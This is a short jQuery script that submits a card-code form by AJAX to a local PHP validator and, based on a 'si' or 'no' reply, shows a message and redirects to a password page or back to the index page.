$(function(){
	$('#frm-codigot').submit(function(e) {

		e.preventDefault();

		var controlador="validar_tarjeta.php";

		$.ajax({
			url:controlador,
			type:'POST',
			data:$('#frm-codigot').serialize(),
			success:function (retorno) {

				if (retorno=='si') {
					$('#mensaje1').show(250).delay(1000).hide(500);
					window.setTimeout("window.location='clave.php';", 2000);
				} else if(retorno=='no'){
					$('#mensaje2').show(250).delay(1000).hide(500);
					window.setTimeout("window.location='index.php';", 2000);
				}

			}


		});
	});
});

	